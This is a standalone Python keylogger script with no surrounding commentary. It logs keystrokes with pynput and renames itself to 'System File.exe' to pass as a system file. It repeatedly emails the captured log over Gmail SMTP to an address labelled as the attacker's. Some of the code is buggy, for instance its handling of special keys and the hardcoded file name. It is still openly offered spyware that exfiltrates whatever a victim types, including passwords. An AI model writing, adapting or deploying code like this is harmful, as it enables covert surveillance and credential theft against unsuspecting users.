import os
import time
import smtplib
from pynput import keyboard
import winshell

LOG_FILE = 'keylog.txt'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
EMAIL_ADDRESS = 'attacker@example.com'
EMAIL_PASSWORD = 'password'
INTERVAL = 300  # Time interval between sending logs (in seconds)

def log_keystrokes(key):
    with open(LOG_FILE, 'a') as file:
        if key.char is not None:
            file.write(f'{key.char}')
        elif key == keyboard.Key.space:
            file.write(' ')
        elif key == keyboard.Key.enter:
            file.write('\n')

def on_press(key):
    log_keystrokes(key)

def hook_keyboard():
    with keyboard.Listener(on_press=on_press) as listener:
        while True:
            time.sleep(10)
            send_logs()

def hide_file():
    shortcut = winshell.CreateShortcut(
        {'Path': os.path.abspath(__file__), 'Target': f'"{os.path.abspath(__file__)}"', 
         'IconLocation': f'{os.path.abspath(__file__)}', 'Description': 'Keylogger'})
    shortcut.save()
    os.rename('keylogger.pyw', 'System File.exe')

def send_logs():
    with open(LOG_FILE, 'r') as file:
        content = file.read()

    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        subject = f'Keylogger Log - {time.ctime()}'
        body = f'Subject: {subject}\n\n{content}'
        server.sendmail(EMAIL_ADDRESS, 'recipient@example.com', body)
    except Exception as e:
        print(f"Error occurred while sending logs: {e}")
    finally:
        server.quit()

if __name__ == '__main__':
    hide_file()
    hook_keyboard()
